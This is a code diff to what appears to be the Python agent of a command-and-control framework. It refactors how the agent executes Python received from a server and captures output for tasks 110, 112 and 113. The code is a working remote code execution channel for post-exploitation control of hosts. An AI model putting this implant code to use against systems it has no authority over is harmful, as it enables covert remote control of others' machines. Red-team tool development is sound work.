@@ -606,10 +606,9 @@ class MainAgent:
         try:
             globals().update({'agent':self})
             buffer = StringIO()
-            sys.stdout = buffer
+            exec_globals = {**globals(), 'print': lambda *a, **k: print(*a, **k, file=buffer)}
             code_obj = compile(data, "<string>", "exec")
-            exec(code_obj, globals())
-            sys.stdout = sys.__stdout__
+            exec(code_obj, exec_globals)
             results = buffer.getvalue()
             self.packet_handler.send_message(self.packet_handler.build_response_packet(110, str(results), result_id))
             self.tasks[result_id]["status"] = "completed"
@@ -634,10 +633,9 @@ class MainAgent:
         data = data[20:]
         try:
             buffer = StringIO()
-            sys.stdout = buffer
             code_obj = compile(data, "<string>", "exec")
-            exec(code_obj, globals())
-            sys.stdout = sys.__stdout__
+            exec_globals = {**globals(), 'print': lambda *a, **k: print(*a, **k, file=buffer)}
+            exec(code_obj, exec_globals)
             results = buffer.getvalue().encode("latin-1")
             c = compress()
             start_crc32 = c.crc32_data(results)
@@ -668,98 +666,52 @@ class MainAgent:
             )
             self.tasks[result_id]["status"] = "error"
 
-    def disk_code_execution_wait_save(self, data, result_id):
+    def python_job_func(self, data, result_id):
         """
-        Execute on-disk code and wait for the results while saving output.
+        Execute python script, wait for the results and return stdout.
         Adjusted for Windows and cross-platform compatibility.
         Task 112
         """
+        output_capture = io.StringIO()
+        script_globals = {'print': lambda *a, **k: print(*a, **k, file=output_capture)}
+
         try:
-            script_globals = {}
-            output_capture = io.StringIO()
-            sys.stdout = output_capture
-
-            try:
-                exec(data, script_globals)
-            except SyntaxError as e:
-                result = "[!] Syntax error in script: %s on line %d - %s" % (str(e), e.lineno, e.text)
-                self.packet_handler.send_message(
-                    self.packet_handler.build_response_packet(0, result, result_id)
-                )
-                self.tasks[result_id]["status"] = "error"
-                return
-
-            except Exception as e:
-                result = "[!] Error executing script: %s" % str(e)
-                self.packet_handler.send_message(
-                    self.packet_handler.build_response_packet(0, result, result_id)
-                )
-                self.tasks[result_id]["status"] = "error"
-                return
-
+            exec(data, script_globals)
             captured_output = output_capture.getvalue()
-
             if captured_output:
                 result = "[*] Output from script:\n" + captured_output
             else:
                 result = "[*] No output captured from the script.\n"
-
             if 'output' in script_globals:
                 result += "[*] Output variable from script: \n" + str(script_globals['output'])
-
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(112, result, result_id)
             )
             self.tasks[result_id]["status"] = "completed"
 
-        except Exception as e:
+        except SyntaxError as e:
+            result = "[!] Syntax error in script: %s on line %d - %s" % (str(e), e.lineno, e.text)
             self.packet_handler.send_message(
-                self.packet_handler.build_response_packet(
-                    0, "error executing TASK_PYTHON_CMD_JOB: %s" % (e), result_id
-                )
+                self.packet_handler.build_response_packet(0, result, result_id)
             )
             self.tasks[result_id]["status"] = "error"
 
-        finally:
-            sys.stdout = sys.__stdout__
+        except Exception as e:
+            result = "[!] Error executing script: %s" % str(e)
+            self.packet_handler.send_message(
+                self.packet_handler.build_response_packet(0, result, result_id)
+            )
+            self.tasks[result_id]["status"] = "error"
 
 
     def start_python_job(self, code, result_id):
-        # create a new code block with a defined method name
-        code_block = "def method():\n" + indent(code)
-
-        # register the code block
-        code_obj = compile(code_block, "<string>", "exec")
-        # code needs to be in the global listing
-        # not the locals() scope
-        exec(code_obj, globals())
-
         # create/process Packet start/return the thread
         # call the job_func so sys data can be captured
-        code_thread = KThread(target=self.python_job_func, args=(result_id,))
+        code_thread = KThread(target=self.python_job_func, args=(code, result_id,))
         code_thread.start()
 
         self.tasks[result_id]['task_thread'] = code_thread
         self.tasks[result_id]["status"] = "running"
-
-    def python_job_func(self, result_id):
-        try:
-            buffer = StringIO()
-            sys.stdout = buffer
-            # now call the function required
-            # and capture the output via sys
-            method()
-            sys.stdout = sys.__stdout__
-            data_stats = buffer.getvalue()
-            result = self.packet_handler.build_response_packet(110, str(data_stats), result_id)
-            self.packet_handler.process_job_tasking(result)
-            self.tasks[result_id]["status"] = "completed"
-
-        except Exception as e:
-            p = "error executing specified Python job data: " + str(e)
-            result = self.packet_handler.build_response_packet(0, p, result_id)
-            self.packet_handler.process_job_tasking(result)
-            self.tasks[result_id]["status"] = "error"
 
     def job_message_buffer(self, message):
         # Supports job messages for checkin
@@ -1097,7 +1049,7 @@ class MainAgent:
                 self.dynamic_code_execution_wait_save(data, result_id)
 
             elif packet_type == 112:
-                self.disk_code_execution_wait_save(data, result_id)
+                self.start_python_job(data, result_id)
 
             elif packet_type == 113:
                 self.start_python_job(data, result_id)
